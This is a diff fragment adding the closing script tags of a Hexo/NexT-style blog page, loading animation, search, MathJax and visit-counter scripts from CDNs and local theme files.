+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"all","js":{"url":"https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js","integrity":"sha256-r+3itOMtGGjap0x+10hu6jW/gZCzxHsoKrOd7gyRSGY="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+
+</body>
+</html>
